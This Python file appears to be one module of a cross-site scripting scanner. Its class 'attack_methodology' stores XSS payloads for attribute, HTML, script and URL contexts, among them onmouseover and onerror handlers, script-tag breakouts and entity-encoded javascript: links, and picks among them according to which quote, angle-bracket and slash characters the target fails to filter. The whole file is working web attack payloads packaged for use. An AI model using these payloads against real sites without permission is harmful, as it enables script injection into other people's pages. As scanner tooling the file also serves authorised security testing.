

class attack_methodology:
    attr    = ['" onmouseover="alert`1`', "' onmouseover='alert`1`"]
    html    = ["<img src=x onerror='alert`1`'>", '<img src=x onerror="alert`1`">']
    script  = ['"; confirm`1`; "', "'; confirm`1`; '",  '</script><script>alert`1`</script>']
    url     = ['<a href="ja&#9;vasc&#10;ript&#58;alert&#40;1&#41;">XYZ_XSS</a>', '%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E' ]
    #  , '%3Ca%20href%3D%22XSS%22%3Eclick_me%3C%2Fa%3E']

    def get_attack_payload(self, context, presence, double_quotes, single_quotes, lessthan_sign, forwardslash):
        payloads = [] 
        
        if context == 'ATTR':
            if not presence : return False, None
            if not double_quotes:   payloads.append(self.attr[0])
            if not single_quotes:   payloads.append(self.attr[1])
            return True, payloads

        if context == 'HTML':   
            if not presence : return False, None
            if not lessthan_sign and not single_quotes:   payloads.append(self.html[0])
            if not lessthan_sign and not double_quotes:   payloads.append(self.html[1])
            return True, payloads

        if context == 'SCRIPT':
            if not presence : return False, None
            if not double_quotes:   payloads.append(self.script[0])
            if not single_quotes:   payloads.append(self.script[1])
            if not lessthan_sign and not forwardslash:   payloads.append(self.script[2])
            return True, payloads
            
        if context == 'URLs':
            if not presence : return False, None
            if not double_quotes and not forwardslash:   payloads.append(self.url[0])
            if not single_quotes:   payloads.append(self.url[1])
            return True, payloads
        
        return False, None

    def toString(self):
        return 'AttackMethodology'

if __name__ == "__main__":
    AM = attack_methodology()
    print('{AttackMethodology}')
    

